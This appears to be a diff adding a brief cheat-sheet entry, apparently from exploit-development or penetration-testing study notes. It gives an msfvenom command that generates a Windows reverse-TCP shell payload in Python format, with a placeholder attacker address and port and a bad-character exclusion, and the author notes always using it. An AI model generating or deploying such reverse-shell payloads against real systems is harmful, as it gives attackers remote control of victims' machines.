@@ -1,0 +1,4 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=XXX.XXX.XXX.XXX LPORT=XXXX -b "\xBadchars" -f python
+
+**NOTE**
+I always use this payload another pyaloads are generated looking by the same payload.
